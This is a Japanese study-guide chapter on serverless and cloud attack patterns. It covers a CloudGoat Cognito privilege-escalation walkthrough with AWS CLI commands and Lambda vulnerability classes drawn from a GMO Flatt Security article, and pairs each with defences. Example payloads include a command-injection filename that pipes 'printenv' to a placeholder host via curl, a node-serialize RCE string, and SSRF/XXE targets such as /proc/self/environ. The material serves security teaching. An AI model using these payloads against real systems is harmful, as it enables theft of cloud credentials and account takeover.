なお、flaws2.cloudにはこの後もLambdaの権限昇格やDefenderパス（CloudTrailログをjq・Athenaで解析し、実際の侵入経路を特定する演習）が続くが、本節作成時点の自動取得ではLevel 1〜3までの詳細のみが確認できた。Defenderパスの学習価値は高く、「攻撃者がどの順序でAPIコールを行ったか」をCloudTrailの `eventName`・`sourceIPAddress`・`userIdentity` から時系列に再構成する訓練は、実務のインシデントレスポンスに直結するため、関心があれば公式サイトで直接取り組むことを推奨する。

### 2. CloudGoat vulnerable_cognito ― Cognitoの認可バイパスによる権限昇格

CloudGoat は Rhino Security Labs が公開している「意図的に脆弱なAWS環境」をTerraformで構築するCTF形式のツールで、`vulnerable_cognito` はその中の1シナリオである。目的は「Cognito Identity Poolから有効なAWSアクセスキーを取得すること」で、小〜中規模の難易度に分類される。

構成としては、API Gateway経由でログイン・サインアップ用のWebページが提供され、その裏でAmazon Cognito User Pool（ユーザーのID・パスワードなどを管理する認証基盤）とCognito Identity Pool（認証済みユーザーに一時的なAWS IAM権限を払い出す仕組み）が連携している。攻撃の流れは次の6段階である。

```bash
# ① まずWebのサインアップフォームからメールアドレス確認(検証コード送信)を試みるが、
#    実在しないメールドメイン等のためサーバー側検証で弾かれる

# ② ブラウザの開発者ツール(ページソース/Networkタブ)から、
#    フロントエンドに埋め込まれた Cognito User Pool の App Client ID を取得する

# ③ AWS CLIで直接 Cognito User Pool に対してサインアップ・メール確認を行い、
#    Webフォーム側のクライアントサイド検証を完全にバイパスする
aws cognito-idp sign-up \
  --client-id <取得したClientID> \
  --username attacker@example.com \
  --password "P@ssw0rd123!"

aws cognito-idp admin-confirm-sign-up \
  --user-pool-id <UserPoolID> \
  --username attacker@example.com
# (演習環境では管理者権限のCLIでconfirmまで進められるよう構築されている、
#  もしくは自己確認可能な設定ミスが想定される)

# ④ 作成したユーザーでログインし、reader.html等のページで
#    「サインアップ後に付与されるカスタムユーザー属性(custom:xxx)」の存在を発見する

# ⑤ カスタム属性の値をAWS CLIで書き換え、権限昇格を狙う
aws cognito-idp update-user-attributes \
  --access-token <ログインで取得したAccessToken> \
  --user-attributes Name="custom:role",Value="admin"

# ⑥ 再ログインし、Cognito Identity Poolが発行するAWS一時クレデンシャルを
#    (Burp Suiteなどでレスポンスを観察して)取得する
aws sts get-caller-identity --profile stolen-identitypool-creds
```

**なぜこれが起きるのか（仕組みレベル）**: Cognito User Poolのカスタム属性（`custom:` プレフィックスを持つ属性）は、デフォルトでは「アプリケーションクライアント側から書き込み可能（writable）」に設定されることがある。本来、`custom:role` のような権限に関わる属性はアプリケーションのバックエンド（サーバー側）だけが書き込めるように `Mutable` かつ「書き込み権限を持つクライアントを限定する」設定にすべきだが、これが緩い設定のまま公開されていると、ユーザー自身がAWS CLIから直接 `update-user-attributes` を呼び出すだけで、本来サーバー側だけが決定すべき「自分の権限レベル」を自己申告的に書き換えられてしまう。さらにCognito Identity Poolは、User Poolでの認証結果（IDトークン内のクレーム、ここには先ほど書き換えたカスタム属性も含まれ得る）を条件としたロールマッピング（Role-based Access Control）で、認証済みユーザーにどのIAMロールを引き受けさせるかを決定する。つまり「クライアント側で改ざん可能な属性」を「IAMロール選択の判断材料」に使ってしまうと、認可ロジックの信頼の起点がクライアントに漏れ出し、権限昇格が成立する。また、そもそも最初のサインアップ段階で「クライアント側のみのバリデーション（フォームの入力チェック）」に依存し、サーバー側でのメールドメイン・招待コード等の検証を欠いていた点も、無関係なユーザーがユーザープールに登録できてしまう入口として機能している。

防御としては、(1) `custom:` 属性のうち権限判定に使うものは、Cognitoのユーザー属性スキーマ定義で該当App Clientからの書き込み権限（Writable Attributes）を明示的にオフにする、(2) 権限やロールの決定はIDトークンのクレームをそのまま信じるのではなく、バックエンドのDB等サーバー側が真の情報源（source of truth）となるようにする、(3) Identity PoolのRole Mappingで「認証済みユーザーに払い出すIAMロール」自体にも最小権限を適用し、仮に昇格されても実害を局所化する、(4) サインアップ・確認フローはサーバー側でもレート制限・ドメイン検証・招待制などを併用する、という点が基本方針になる。

> ⚠️ **未取得の資料**: 担当URLの「ro0taddict『AWS Pentesting: Cloudgoat’s vulnerable_cognito』」記事本文（https://rodelllemit.medium.com/aws-pentesting-cloudgoat-vulnerable-cognito-0d6e3809dada）は、Mediumのアクセス制限（HTTP 403 Forbidden）により自動取得できませんでした。以下のURLからご自身で直接ご覧ください: https://rodelllemit.medium.com/aws-pentesting-cloudgoat-vulnerable-cognito-0d6e3809dada
> 上記の攻撃手順および仕組みの解説は、代替取得したCloudGoat公式シナリオREADME（GitHub: RhinoSecurityLabs/cloudgoat, `scenarios/aws/vulnerable_cognito/README.md`）の内容と、同シナリオを扱う複数の独立したウォークスルー（Cyber Anom、reveng007、hackingthe.cloud、TrustOnCloud）の要約情報を突き合わせて構成した、一般知識も交えた解説です。細部のコマンドオプションは実際のシナリオ環境によって異なる場合があるため、正確な手順は原文および自分の演習環境で確認してほしい。

> 出典: CloudGoat `vulnerable_cognito` シナリオ README（RhinoSecurityLabs） — https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_cognito/README.md
> 参考: Hacking The Cloud「Abusing Overpermissioned AWS Cognito Identity Pools」 — https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/

### 3. 【日本語】Lambda/サーバーレス特有の脆弱性クラス（GMO Flatt Security）

GMO Flatt Securityのブログ記事「サーバーレスのセキュリティリスク - AWS Lambdaにおける脆弱性攻撃と対策」（2022年3月16日公開、同年3月17日にSecrets Managerに関する記述を追加）は、Lambda関数自体のアプリケーションコードに潜みがちな脆弱性クラスを、OWASP Serverless Top 10を軸に整理している。サーバレス関数はステートレスな「グルーコード」として軽視されがちだが、実際には通常のWebアプリケーションと同種の脆弱性がそのまま持ち込まれ、しかもIAMロールという強力な権限が紐づいている分、被害が単なる情報漏えいに留まらずAWSアカウント全体への波及に直結しやすい。

#### 3-1. OSコマンドインジェクション（CWE-78）によるクレデンシャル外部送信

```python
subprocess.call(
    'cd /tmp; convert {FileName} {Path}{File}'.format(
        FileName=download_file, Path=path, File=name
    ),
    shell=True
)
```

`download_file` にユーザーが指定したファイル名がそのまま文字列結合されており、`shell=True` でOSのシェルにコマンド文字列全体を渡している。ここでファイル名として次のような値を与えると、セミコロンでコマンドが区切られ、任意コマンドが追加実行される。

```
hoge; printenv | curl X.X.X.X --data-urlencode @-; #.jpg
```

**なぜ危険か**: Lambdaの実行環境では、そのLambda関数にアタッチされたIAMロールの一時クレデンシャル（`AWS_ACCESS_KEY_ID`・`AWS_SECRET_ACCESS_KEY`・`AWS_SESSION_TOKEN`）が環境変数として自動的に渡される。`printenv` はプロセスの環境変数を一覧表示するコマンドであり、これを外部サーバーへPOSTするワンライナーを注入されると、Lambda関数の実行権限（＝IAMロールの権限）がまるごと攻撃者の手に渡ってしまう。対策は、シェル経由の外部コマンド実行を避け（`subprocess.call([...], shell=False)`のように引数配列で渡す、あるいは専用ライブラリを使う）、ユーザー入力をコマンド文字列へ直接連結しないことに尽きる。

#### 3-2. XXE（XML External Entity、CWE-611）によるローカルファイル読み取り

```python
parser = etree.XMLParser()
document = etree.fromstring(download_file, parser)
```

デフォルト設定のXMLパーサーは外部エンティティの解決を許可していることが多く、攻撃者が細工したXML内で外部エンティティを定義すると、`file:///var/task/handler.py`（Lambda関数のソースコード本体）や `file:///proc/self/environ`（プロセスの環境変数、ここにもクレデンシャルが含まれる）を読み込ませることができる。パーサーの安全な初期化（外部エンティティ解決の無効化、たとえばPythonの`lxml`であれば`resolve_entities=False`かつDTD処理を無効化する等）が根本対策となる。

#### 3-3. 安全でないデシリアライズ（CWE-502）とnode-serializeの実例

Node.js向けの `node-serialize` パッケージ（バージョン0.0.4、CVE-2017-5941）は、シリアライズされたオブジェクトを復元する際に内部で`eval()`相当の処理を行っていたため、次のようなペイロードで任意コード実行が可能だった。

```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('printenv', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

**なぜ危険か**: デシリアライズ処理は「データを受け取ってプログラム内部のオブジェクトに復元する」という一見安全そうな操作だが、復元のためのロジックに`eval`のような動的コード評価が使われていると、シリアライズされたデータ自体が実行可能コードの運び屋になってしまう。これは言語・ライブラリを問わず繰り返し現れるパターン（Javaの`ObjectInputStream`、PHPの`unserialize`なども同種のリスクを持つ）であり、外部入力を信頼できない形式のままデシリアライズしないこと、信頼済みライブラリの既知CVEを継続的に追跡することが対策になる。

#### 3-4. SSRF（CWE-918）― Lambda Runtime APIやローカルファイルへの到達

```javascript
request.get(url, (error, response, body) => {
  resolve(response)
})
```

ユーザーが指定したURLをそのままHTTPクライアントに渡している場合、`http://localhost:9001/2018-06-01/runtime/invocation/next`（Lambdaのランタイムインターフェース）や`file://`スキーマ経由での`/proc/self/environ`読み込みが可能になる。実例として、PDF生成ライブラリ`reportlab`のCVE-2020-28463では、PDF内の`<img>`タグを通じてSSRFが引き起こされたことが紹介されている。対策はURLのスキーム・宛先ホストをアローリスト方式で検証し、リダイレクトも含めて内部アドレス帯（ループバック、リンクローカル、プライベートIPレンジ）への到達を遮断することである。

#### 3-5. IAMロールと環境変数管理、監視・監査の設計

記事はこれらの脆弱性が共通して「IAMロールのクレデンシャルが環境変数から奪取される」という最終的な被害に収斂する点を強調し、対策として次を挙げている。

- **最小権限の原則**でLambda実行ロールを設計し、IAMのアクセス許可境界（permissions boundary）も併用する。
- シークレットは環境変数への直書きではなく、**AWS Secrets Manager**や**SSMパラメータストア**から実行時に取得する（2022年3月17日の更新で追記された観点）。
- 依存パッケージは最新版を維持し、不要な依存を削除、Lambda Layersで共通ライブラリを一元管理する（OWASP Serverless Top 10の「既知の脆弱性のあるコンポーネント使用」に対応）。
- **CloudWatch**でメトリクス・アラームを設定し、**CloudTrail**のデータイベント（デフォルト無効、有効化には追加コストが発生する点に注意）でLambdaの実行記録を残し、**AWS X-Ray**でInitialization/Invocation/Overheadの各フェーズをトレースする。**AWS Config**のマネージドルールで同時実行数制限やパブリックアクセス禁止などの設定逸脱を継続的に検知する。
- **AWS Signer**によるコード署名で、デプロイされるコードの整合性・有効期限・署名の失効状態を検証する。

これらはいずれも「実行環境がコンテナ的に使い回される」「クレデンシャルが環境変数という比較的アクセスしやすい場所に置かれる」というLambda特有の実行モデルを前提にした対策であり、flaws2.cloudやCloudGoatの演習で実際に悪用された経路（デバッグ出力、SSRF経由のメタデータ窃取）に直接対応している点に注目してほしい。

> 出典: GMO Flatt Security「サーバーレスのセキュリティリスク - AWS Lambdaにおける脆弱性攻撃と対策」 — https://blog.flatt.tech/entry/lambda_and_serverless_security

### 4. 【日本語】GMO Flatt Security Blog AWSカテゴリの関連記事

GMO Flatt Security BlogのAWSカテゴリ一覧からは、サーバレス／クラウドセキュリティに関連する日本語記事が多数見つかる。特に本節のテーマと関連が深いのは次の3本である。

- **「重複したIAM、拒否と許可どっちが優先？」（2024年12月4日）**: AWS・Google Cloud・Azure・Firebaseそれぞれについて、ポリシー内に`Allow`（許可）と`Deny`（拒否）が重複・競合した場合にどちらが優先されるかを、クイズ形式で比較解説している。AWSのIAMポリシー評価ロジックでは、明示的な`Deny`が常に明示的な`Allow`より優先される（暗黙のDenyがデフォルトであり、複数のポリシーを跨いでも明示的Denyが最終的に勝つ）という評価順序（Explicit Deny > Explicit Allow > Implicit Deny）を理解しておくことは、本節で扱ったような「複数のIAMロール・ポリシーが絡む権限昇格経路」を正しく設計・監査するうえで基礎になる。
- **「AWS Lambdaで秘密情報をセキュアに扱う」（2022年11月8日）**: 前節のLambda脆弱性解説を補完する内容で、環境変数への直書きを避けSecrets Manager/Parameter Storeを使う具体的な実装パターンを扱っている。
- **「Lambdaの落とし穴 - 脆弱なライブラリによる危険性とセキュリティ対策」（2022年2月24日）**: 依存ライブラリの脆弱性がLambda関数経由でどう悪用されるかを扱っており、3-3節のnode-serialize事例と同種の問題を別の切り口から補強する。

> 出典: GMO Flatt Security Blog AWSカテゴリ一覧 — https://blog.flatt.tech/archive/category/AWS

### 5. まとめ ― サーバレス／コンテナ攻撃の共通パターン

本節で扱った3つの資料（flaws2.cloud、CloudGoat vulnerable_cognito、GMO Flatt Securityのブログ2本）を横断して見えてくるのは、サーバレス／コンテナ環境における攻撃の多くが、次の3つのいずれか（またはその組み合わせ）に帰着するという構造である。

1. **信頼境界の取り違え**: クライアント側のバリデーションやクライアントが書き換え可能な属性（Cognitoのカスタム属性）を、サーバー側の認可判断の根拠にしてしまう。
2. **メタデータ／クレデンシャル配布エンドポイントへの到達**: SSRFやローカルファイル読み取り系の脆弱性（XXE、コマンドインジェクション経由の環境変数窃取）を通じて、Lambda/ECSが持つ一時クレデンシャルに到達する。
3. **意図しない公開設定の見落とし**: S3バケットだけでなくECRリポジトリのような周辺リソースにも公開・過剰権限の設定ミスが起こり得る。

これらはいずれも「クラウドのサービスモデルが便利にしてくれる自動化（IAMロールの自動クレデンシャル発行、Identity Poolによる自動ロール割当、コンテナレジストリの共有）」の裏側に、攻撃者にとっての近道が生まれるという構図であり、防御側としては最小権限の徹底、サーバー側での多層検証、そしてCloudTrail等による継続的な監査ログの活用が、これらの演習全体を貫く一貫した対策方針であることを押さえておきたい。


---

[← 第5章 IAM誤設定と権限昇格](05-iam-privilege-escalation.md) ｜ [目次](index.md) ｜ [第7章 露出クレデンシャル・シークレットのRecon →](07-secret-recon.md)
